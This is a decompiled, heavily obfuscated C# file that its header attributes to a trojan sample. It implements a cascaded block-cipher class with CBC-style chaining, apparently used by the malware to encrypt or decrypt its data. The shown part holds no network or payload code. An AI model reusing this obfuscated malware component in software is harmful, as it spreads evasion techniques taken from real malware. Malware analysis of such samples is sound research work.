// Decompiled with JetBrains decompiler
// Type: ​
// Assembly: Geuohxlmylmazmxloypoatjz, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8CA089DF-C4D9-4B1E-E7CA-2914077BCF28
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\VHO-Trojan.Win32.Sdum.gen-4254e5854381e028a60696e5a55f76a87f7c2cd3f182df59feee1e14a71407e4.exe

using System;
using System.Security.Cryptography;

internal sealed class \u000E​ : SymmetricAlgorithm
{
  private readonly SymmetricAlgorithm[] \u0002;
  private readonly int \u0003;

  public \u000E​(params SymmetricAlgorithm[] _param1)
  {
    SymmetricAlgorithm[] symmetricAlgorithmArray = (SymmetricAlgorithm[]) _param1.Clone();
    if (true)
      goto label_2;
label_1:
    SymmetricAlgorithm[] array = _param1;
    Comparison<SymmetricAlgorithm> comparison1 = \u000E​.\u0002.\u0003;
    if (comparison1 == null)
    {
      Comparison<SymmetricAlgorithm> comparison2 = new Comparison<SymmetricAlgorithm>(\u000E​.\u0002.\u0002.\u0002);
      if (false)
      {
        comparison1 = comparison2;
      }
      else
      {
        \u000E​.\u0002.\u0003 = comparison2;
        comparison1 = comparison2;
      }
    }
    if (true)
      goto label_8;
label_7:
    this.\u0002 = _param1;
    int num = 0;
    foreach (SymmetricAlgorithm symmetricAlgorithm in _param1)
    {
      num += symmetricAlgorithm.KeySize;
      symmetricAlgorithm.Mode = CipherMode.ECB;
      symmetricAlgorithm.Padding = PaddingMode.None;
    }
    this.BlockSizeValue = _param1[_param1.Length - 1].BlockSize;
    this.LegalBlockSizesValue = new KeySizes[1]
    {
      new KeySizes(this.BlockSizeValue, this.BlockSizeValue, 0)
    };
    this.KeySizeValue = num;
    this.LegalKeySizesValue = new KeySizes[1]
    {
      new KeySizes(num, num, 0)
    };
    this.\u0003 = _param1[0].BlockSize;
    this.Mode = CipherMode.ECB;
    this.Padding = PaddingMode.None;
    return;
label_8:
    Array.Sort<SymmetricAlgorithm>(array, comparison1);
    goto label_7;
label_2:
    _param1 = symmetricAlgorithmArray;
    goto label_1;
  }

  public int \u0002()
  {
    if (true)
      ;
    return this.\u0003;
  }

  public override byte[] IV
  {
    get
    {
      if (true)
        ;
      return base.IV;
    }
    set
    {
      byte[] numArray = (byte[]) value.Clone();
      if (false)
        return;
      this.IVValue = numArray;
    }
  }

  public override ICryptoTransform CreateDecryptor(byte[] _param1, byte[] _param2)
  {
    if (true)
      ;
    byte[] numArray1 = _param1;
    if (true)
      ;
    byte[] numArray2 = _param2;
    if (true)
      ;
    return this.\u0002(numArray1, numArray2, false);
  }

  public override ICryptoTransform CreateEncryptor(byte[] _param1, byte[] _param2)
  {
    if (true)
      ;
    byte[] numArray1 = _param1;
    if (true)
      ;
    byte[] numArray2 = _param2;
    if (true)
      ;
    return this.\u0002(numArray1, numArray2, true);
  }

  private ICryptoTransform \u0002(byte[] _param1, byte[] _param2, bool _param3)
  {
    byte[] numArray1 = _param1;
    if (true)
      ;
    int num = numArray1.Length * 8;
    if (true)
      ;
    int keySize = this.KeySize;
    if (num != keySize)
      throw new ArgumentException(\u0008\u2008\u2000.\u0002(1229877821), \u0008\u2008\u2000.\u0002(1229877765));
    byte[] numArray2 = _param2;
    if (true)
      ;
    if (numArray2.Length * 8 != this.\u0002())
      throw new ArgumentException(\u0008\u2008\u2000.\u0002(1229877776), \u0008\u2008\u2000.\u0002(1229877735));
    return (ICryptoTransform) new \u000E​.\u0003(this.\u0002, _param1, _param2, _param3);
  }

  public override void GenerateIV() => throw new NotSupportedException();

  public override void GenerateKey() => throw new NotSupportedException();

  [Serializable]
  private sealed class \u0002
  {
    public static readonly \u000E​.\u0002 \u0002;
    public static Comparison<SymmetricAlgorithm> \u0003;

    static \u0002()
    {
      \u000E​.\u0002 obj = new \u000E​.\u0002();
      if (false)
        return;
      \u000E​.\u0002.\u0002 = obj;
    }

    public \u0002()
    {
      if (true)
        ;
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal int \u0002(SymmetricAlgorithm _param1, SymmetricAlgorithm _param2)
    {
      int blockSize = _param2.BlockSize;
      if (true)
        goto label_2;
label_1:
      int num;
      return num.CompareTo(_param1.BlockSize);
label_2:
      num = blockSize;
      goto label_1;
    }
  }

  private sealed class \u0003 : ICryptoTransform, IDisposable
  {
    private readonly byte[] \u0002;
    private readonly byte[] \u0003;
    private readonly SymmetricAlgorithm[] \u0005;
    private ICryptoTransform[] \u0008;
    private readonly bool \u0006;
    private readonly int \u000E;

    public \u0003(SymmetricAlgorithm[] _param1, byte[] _param2, byte[] _param3, bool _param4)
    {
      byte[] numArray1 = _param2;
      if (true)
        goto label_4;
label_1:
      byte[] numArray2 = _param3;
      if (true)
        goto label_5;
label_2:
      SymmetricAlgorithm[] symmetricAlgorithmArray = _param1;
      if (true)
        goto label_6;
label_3:
      this.\u0006 = _param4;
      this.\u000E = _param1[_param1.Length - 1].BlockSize / 8;
      return;
label_6:
      this.\u0005 = symmetricAlgorithmArray;
      goto label_3;
label_5:
      this.\u0003 = numArray2;
      goto label_2;
label_4:
      this.\u0002 = numArray1;
      goto label_1;
    }

    public int InputBlockSize
    {
      get
      {
        if (true)
          ;
        return this.\u000E;
      }
    }

    public int OutputBlockSize
    {
      get
      {
        if (true)
          ;
        return this.\u000E;
      }
    }

    public bool CanTransformMultipleBlocks => true;

    public bool CanReuseTransform => true;

    public void Dispose()
    {
      if (this.\u0008 == null)
        return;
      ICryptoTransform[] cryptoTransformArray1 = this.\u0008;
      if (true)
        goto label_3;
label_2:
      int index;
      if (true)
        index = 0;
      ICryptoTransform[] cryptoTransformArray2;
      for (; index < cryptoTransformArray2.Length; ++index)
      {
        ICryptoTransform cryptoTransform1 = cryptoTransformArray2[index];
        if (true)
          goto label_8;
label_6:
        ICryptoTransform cryptoTransform2;
        if (cryptoTransform2 != null)
        {
          cryptoTransform2.Dispose();
          continue;
        }
        continue;
label_8:
        cryptoTransform2 = cryptoTransform1;
        goto label_6;
      }
      this.\u0008 = (ICryptoTransform[]) null;
      return;
label_3:
      cryptoTransformArray2 = cryptoTransformArray1;
      goto label_2;
    }

    private void \u0002()
    {
      SymmetricAlgorithm[] symmetricAlgorithmArray1 = this.\u0005;
      if (true)
        goto label_4;
label_1:
      SymmetricAlgorithm[] symmetricAlgorithmArray2;
      int length1 = symmetricAlgorithmArray2.Length;
      if (true)
        goto label_5;
label_2:
      if (this.\u0008 != null)
        return;
      int length2;
      ICryptoTransform[] cryptoTransformArray1 = new ICryptoTransform[length2];
      if (true)
        goto label_8;
label_7:
      int srcOffset = 0;
      ICryptoTransform[] cryptoTransformArray2;
      for (int index = 0; index < length2; ++index)
      {
        SymmetricAlgorithm symmetricAlgorithm = symmetricAlgorithmArray2[index];
        int count = symmetricAlgorithm.KeySize / 8;
        byte[] numArray = new byte[count];
        Buffer.BlockCopy((Array) this.\u0002, srcOffset, (Array) numArray, 0, count);
        srcOffset += count;
        byte[] rgbIV = new byte[symmetricAlgorithm.BlockSize / 8];
        ICryptoTransform cryptoTransform = this.\u0006 ? symmetricAlgorithm.CreateEncryptor(numArray, rgbIV) : symmetricAlgorithm.CreateDecryptor(numArray, rgbIV);
        cryptoTransformArray2[index] = cryptoTransform;
      }
      this.\u0008 = cryptoTransformArray2;
      return;
label_8:
      cryptoTransformArray2 = cryptoTransformArray1;
      goto label_7;
label_5:
      length2 = length1;
      goto label_2;
label_4:
      symmetricAlgorithmArray2 = symmetricAlgorithmArray1;
      goto label_1;
    }

    public byte[] TransformFinalBlock(byte[] _param1, int _param2, int _param3)
    {
      byte[] numArray1 = new byte[_param3];
      if (true)
        goto label_2;
label_1:
      byte[] numArray2;
      this.TransformBlock(_param1, _param2, _param3, numArray2, 0);
      return numArray2;
label_2:
      numArray2 = numArray1;
      goto label_1;
    }

    public int TransformBlock(
      byte[] _param1,
      int _param2,
      int _param3,
      byte[] _param4,
      int _param5)
    {
      byte[] src = _param1;
      int srcOffset = _param2;
      byte[] dst = _param4;
      int dstOffset = _param5;
      int count = _param3;
      if (true)
        goto label_3;
label_1:
      if (true)
        goto label_4;
label_2:
      if (this.\u0006)
      {
        byte[] numArray = _param4;
        int num1 = _param5;
        int num2 = _param3;
        if (true)
          this.\u0002(numArray, num1, num2);
      }
      else
        this.\u0003(_param4, _param5, _param3);
      return _param3;
label_4:
      this.\u0002();
      goto label_2;
label_3:
      Buffer.BlockCopy((Array) src, srcOffset, (Array) dst, dstOffset, count);
      goto label_1;
    }

    private void \u0002(byte[] _param1, int _param2, int _param3)
    {
      byte[] numArray = new byte[this.\u0003.Length];
      if (true)
        goto label_4;
label_1:
      byte[] src = this.\u0003;
      byte[] dst1;
      byte[] dst2 = dst1;
      int length = dst1.Length;
      if (true)
        goto label_5;
label_2:
      if (true)
        goto label_6;
label_3:
      int num1;
      foreach (ICryptoTransform cryptoTransform in this.\u0008)
      {
        int inputBlockSize = cryptoTransform.InputBlockSize;
        int num2 = _param3 - num1 & ~(inputBlockSize - 1);
        int num3 = num1 + num2;
        for (int index = num1; index < num3; index += inputBlockSize)
        {
          int num4 = index + _param2;
          \u000E​.\u0003.\u0002(_param1, num4, dst1, 0, inputBlockSize);
          cryptoTransform.TransformBlock(_param1, num4, inputBlockSize, _param1, num4);
          Buffer.BlockCopy((Array) _param1, num4, (Array) dst1, 0, inputBlockSize);
        }
        num1 = num3;
        if (num3 == _param3)
          break;
      }
      return;
label_6:
      num1 = 0;
      goto label_3;
label_5:
      Buffer.BlockCopy((Array) src, 0, (Array) dst2, 0, length);
      goto label_2;
label_4:
      dst1 = numArray;
      goto label_1;
    }

    private void \u0003(byte[] _param1, int _param2, int _param3)
    {
      byte[] numArray1 = new byte[this.\u0003.Length];
      if (true)
        goto label_4;
label_1:
      byte[] src = this.\u0003;
      byte[] dst1;
      byte[] dst2 = dst1;
      int length = dst1.Length;
      if (true)
        goto label_5;
label_2:
      byte[] numArray2 = new byte[dst1.Length];
      if (true)
        goto label_6;
label_3:
      int num1 = 0;
      byte[] numArray3;
      foreach (ICryptoTransform cryptoTransform in this.\u0008)
      {
        int inputBlockSize = cryptoTransform.InputBlockSize;
        int num2 = _param3 - num1 & ~(inputBlockSize - 1);
        int num3 = num1 + num2;
        for (int index = num1; index < num3; index += inputBlockSize)
        {
          int num4 = index + _param2;
          Buffer.BlockCopy((Array) _param1, num4, (Array) numArray3, 0, inputBlockSize);
          cryptoTransform.TransformBlock(_param1, num4, inputBlockSize, _param1, num4);
          \u000E​.\u0003.\u0002(_param1, num4, dst1, 0, inputBlockSize);
          Buffer.BlockCopy((Array) numArray3, 0, (Array) dst1, 0, inputBlockSize);
        }
        num1 = num3;
        if (num3 == _param3)
          break;
      }
      return;
label_6:
      numArray3 = numArray2;
      goto label_3;
label_5:
      Buffer.BlockCopy((Array) src, 0, (Array) dst2, 0, length);
      goto label_2;
label_4:
      dst1 = numArray1;
      goto label_1;
    }

    private static void \u0002(
      byte[] _param0,
      int _param1,
      byte[] _param2,
      int _param3,
      int _param4)
    {
      int num1;
      if (true)
        num1 = 0;
      while (num1 < _param4)
      {
        _param0[_param1 + num1] ^= _param2[_param3 + num1];
        int num2 = num1 + 1;
        if (true)
          num1 = num2;
      }
    }
  }
}
